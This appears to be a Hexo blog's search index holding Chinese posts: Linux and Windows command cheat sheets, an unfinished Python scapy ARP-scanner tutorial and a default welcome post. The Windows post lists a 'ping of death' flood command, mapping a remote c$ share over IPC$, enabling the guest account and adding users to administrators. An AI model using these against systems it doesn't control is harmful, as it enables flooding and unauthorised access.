4.tar -r   #追加TAR文件到归档结尾\ntar -rvf 4.tarr 5   #把5加入到4.tar\n-p  #解包时保留原始文件及目录的权限\n-C  #解包时指定释放的目录文件夹\n-z  #调用gzip程序进行解压或压缩\n-j  #调用bzip2程序进行解压或压缩\ntar -cvzf test.ter.gz 被压缩的文件1 被压缩的文件2   #创建归档压缩文件后缀为bz2\ntar -xvzf test.tar.gz -C &#x2F;usr&#x2F;src  #解压释放归档到&#x2F;usr&#x2F;src里面\ntar -xvjf test.tar.bz2 -C &#x2F;usr&#x2F;src   #解压释放归档到&#x2F;usr&#x2F;src里面\n-c   #创建归档文件扩展名为.tar\n-v   #输出详细信息\n-f   #表示使用归档文件    如-cvf   创建归档文件\ntar -cvf 4.tar 1 2 3   #将文件1 2 3 打包归档为4.tar\ntar -xvf 4.tar    #解包归档文件4.tar\n-xvf   #解包归档文件\n-x    #解开归档文件\n-t    #列表查看包内文件(不释放解包)\n\nchmod 命令   修改权限chmod 777 文件名   #提升权限\nr     #4  表示读\nw    #2  表示写\nx    #1  表示可执行 \n777   #表示任何人都拥有所有权限\n\n编译安装过程下载源代码安装文件包文件\n1： tar解包\n2： .&#x2F;configure配置\n3： make编译\n4： make install 安装\n\napt-get命令   安装apt-get install xxx   #安装xxx,直接从网上下载\ndpkg -i xx   #安装xx，Debian软件包\ndpkg -l xx   #列出与xx有关软件\ndpkg -r xx   #删除\n\nuseradd命令   添加用户useradd [选项] 用户名\n-u  #指定uid标记号\n-d  #指定宿主目录\n-e  #指定账号失效时间\n-g  #指定用户的基本组名(或uid号)\n-G  #指定用户的附加组合名(或Gid号)\n-M  #不为用户建立并初始化宿主目录\n-s  #指定用户的登录shell\n\nuserdel命令    删除账号userdel -r 用户名   #表示连用户的宿主目录一并删除\n\nifconfig命令   查看网络接口信息-eth0   #以太网，局域网\n-lo    #(虚拟)回环设备\nppp0   #使用ppp协议的串口设备(通常指调制调解器)\ntr0   #令牌环(Token Ring)\nfddi0  #光纤\nifdown eth0  #禁用网络接口\nifup eth0   #启用网络接口\n\nnetstat命令   查看网络连接情况netstat [选项]\n-a  #显示所有活动连接\n-n  #以数字形式显示\n-p  #显示进程信息\n-t  #查看tcp协议相关信息\n-u  #查看udp协议相关信息\n-r  #显示路由表信息\n\nroute命令     查看路由表条目route [选项]\n-n   #查看路由表条目\nroute del default gw IP地址   #删除路由表中的默认网关记录\nroute add default gw IP地址   #像路由表添加默认网关记录\nroute add -net 网段地址&#x2F;24 gw IP地址  #添加到指定网段的路由记录\nroute del -net 网段地址&#x2F;24 gw IP地址  #删除到指定网段的路由记录\n\nseivice命令    服务命令service xx start  #启动xx服务\nservice network restart  #重启network网络服务\nservice xx stop   #关闭xx服务\n\n基本上会上面这么多就差不多了。放个链接地址方便继续学习：https://www.linuxcool.com/","slug":"Linux命令","date":"2021-09-26T10:03:35.000Z","categories_index":"Linux基础","tags_index":"Linux命令","author_index":"Longw"},{"id":"08b6393a58e95b9436d0c70886fad74f","title":"DOS命令","content":"\n\n常用的DOS命令身为IT人士，怎么能对windows的基本命令不知道呢？来跟我一起学习一下。\n来！我们win+r输入cmd进去：\n入门命令这黑白对比不是太好看。看一下第一条命令，教你怎么变色;\ncolor  【选项】       # 改变cmd字体颜色\n\ncolor -h   #查看帮助\n\n都是中文应该都看得懂的，不懂我们试试嘛：\ncolor a      #变成绿色\n\n这下这条命令都懂了，改变颜色，选项能用 -h  查看。\ncls     #清空前面命令页面\n\n可以看到鼠标不能往上拉了，说明以前的命令等已经被清空了。下面我们进入重点。\n常用的DOS命令ping命令ping   IP&#x2F;域名     #尝试能否链接此IP&#x2F;域名\n\nping baidu.com     #尝试是否能访问百度，最常用来查看网络是否接通\n\nping -t -I 65500:IP   #死亡之ping，发送大量数据包\n\nipconfig命令常用ipconfig     #帮助用户查看网络状况，如延迟、IP、主机信息、物理地址信息等\n\nipconfig&#x2F;all  #显示本机TCP&#x2F;IP配置的详细信息\n\nipconfig &#x2F;release #DHCP客户端手工释放IP地址\n\nipconfig &#x2F;renew   #DHCP客户端手工向服务器刷新请求\n\n\n不常用ipconfig &#x2F;flushdns  #清除本地DNS缓存内容\n\nipconfig &#x2F;displaydns  #显示本地DNS内容\n\nipconfig &#x2F;registerdns   #DNS客户端手工向服务器进行注册\n\nipconfig &#x2F;showclassid   #显示网络适配器的DHCP类别信息\n\nipconfig &#x2F;setclassid   #设置网络适配器的DHCP类别\n\nipconfig &#x2F;renew “Local Area Connection”  #更新“本地连接”适配器的由 DHCP 分配 IP 地址的配置\n\nipconfig &#x2F;showclassid Local*  #显示名称以 Local 开头的所有适配器的 DHCP 类别 ID\n\nipconfig &#x2F;setclassid “Local Area Connection” TEST #将“本地连接”适配器的 DHCP 类别 ID 设置为 TEST\n\n关于文件/目录的命令目录查看及跳转dir    #查看目录\npwd   #查看当前路径\ncd 目录  #切换到指定目录\nd:    #进入d盘，这个不用cd\ncd ..  #返回上级目录\ncd &#x2F; #跳转到根目录\nhelp cd  #查看cd命令详细信息\ntree    #列出路径中文件树形结构\n\n文件/目录创建及删除copy con d:123.txt   #创建123.txt文件\n立马进入输入模式：hello world\n输入完成按CTRL+z  再按回车退出输入模式\nmd 目录名    #创建目录\nrd 目录名    #删除文件夹\ndel 文件名   #删除文件\n\n文件的查看start 文件名   #按照默认打开方式打开查看，也能打开网页等，如:start www.baidu.com\ntrpe 文件名     #在命令行查看\n\n文件的移动copy 文件 移动目录    #复制文件到移动目录中\nmove 文件 移动目录   #将文件移动到相应目录中\n\n文件重命名ren 原文件名 新文件名        #重命名文件\n\n系统命令systeminfo   #查看系统信息\n\narp命令arp -a   #用于查看高速缓存中的所有项目\narp -a IP  #只显示与该接口相关的ARP缓存项目\narp -s IP 物理地址 #人工配置的物理地址将自动更新该项目\narp -d IP   #使用本命令能够人工删除一个静态项目\n\nshutdown命令shutdown -s -t 180 -c “关机”    #定时关机，并提示\nshutdown -a   #取消计划关机\n\nnet命令net view    #查看局域网内吉他计算机的名称\nnet start    #查看开启了哪些服务\nnet start 服务名   #开启服务(如：net start telent)\nnet stop 服务名   #停止服务\nnet use k:\\\\IP\\c$  #映射目标IP到本地k盘\nnet use k:\\\\IP\\c$&#x2F;del   #断开映射\nnet user 用户名 密码 &#x2F;add   #建立用户\nnet suer 用户名 &#x2F;del   #删除用户\nnet user guest&#x2F;active:yes    #激活guest用户\nnet user #查看有哪些用户\nnet user 账户名  #查看账户属性\nnet localgroup administrators 用户名 &#x2F;add   #把“用户”添加到管理员中\nnet user guest 12345 #用guest登陆后将密码改为12345\nnet password 密码  #更改系统登录密码\nnet share  #查看本地开启的共享\nnet share ipc$   #开启ipc$共享\nnet share ipc$ &#x2F;del   #删除ipc$共享\nnetstat -a   #查看端口\nnetstat -n   #查看端口的网络连接情况\nnetstat -v    #查看正在进行的工作\n\nat命令at id号   #开启已注册的某个计划任务\nat &#x2F;delete #停止所有计划任务用参数&#x2F;yes则不需确定就直接停止\nat id号 &#x2F;delete  #停止某个已注册的计划任务\nat #查看所有计划任务\nattrib 文件名(目录名) #查看某文件或目录的属性\nattrib 文件名 -A -R -S -H 或 +A +R +S +H   #去掉(添加)某文件的存档，只读，系统，隐藏属性\n\n批处理文件就是将一些DOS命令写好，并将其放到后缀为.bat的文件里。\n计划命令太多了，不写了查看这个连接就行：https://blog.csdn.net/weixin_34128237/article/details/93049391\n","slug":"DOS命令","date":"2021-09-26T10:03:04.000Z","categories_index":"windows基础","tags_index":"DOS命令","author_index":"Longw"},{"id":"8144d90f97aac2df03b3e52cffae8156","title":"开发网络扫描器","content":"\n\n用Python开发网络扫描器网络扫描器简介我们直接看百度的结果：\n​         迅速发展的Internet给人们的生活、工作带来了巨大的方便，但同时，也带来了一些不容忽视的问题，网络信息的安全保密问题就是其中之一。　　网络的开放性以及的是造成网络不安的主要原因。科学家在设计Internet之初就缺乏对安全性的总体构想和设计，我们所用的TCP/IP 协议是建立在可信的环境之下，首先考虑的是网络互连，它是缺乏对安全方面的考虑的。而且TCP/IP协议是完全公开的，远程访问使许多者无须到现场就能够得手，连接的主机基于互相信任的原则等等这一些性质使网络更加不安全。　　先进的技术是实现网络信息安全的有力武器，这些技术包括:密码技术、身份验证技术、访问控制技术、安全内核技术、网络反病毒技术、信息泄漏防治技术、防火墙技术、网络安全漏洞扫描技术、检测技术等。而在系统发生安全事故之前对其进行预防性检查，及时发现问题并予以解决不失为一种很好的办法，于是网络安全漏洞扫描技术应运而生。\n用Python编写网络扫描器程序话不多说，直接干，首先了解一下scapy这个库的ARP模块：\n#!&#x2F;usr&#x2F;bin&#x2F;env python\n# -*- coding: utf-8 -*-\n# @Time :2021-09-15 14:15\n# @Author : longw\n# @File : network_scanner_argparse.py\n# @Software : PyCharm\n\n\nimport scapy.all as scapy\n\ndef scan(ip): # 广播ip地址\n\tscapy.arping(ip) \n\nscan(&quot;192.168.253.2&quot;)  #路由地址\n\n\n想要知道路由地址，直接在Linux主机终端输入：\nroute -n\n\n来看下程序执行结果：\n图片1……………正在输入中。。。。。。。","slug":"开发网络扫描器","date":"2021-09-20T10:54:58.000Z","categories_index":"开发网络扫描器","tags_index":"payload","author_index":"Longw"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2021-08-18T06:43:13.628Z","categories_index":"","tags_index":"","author_index":"Longw"}]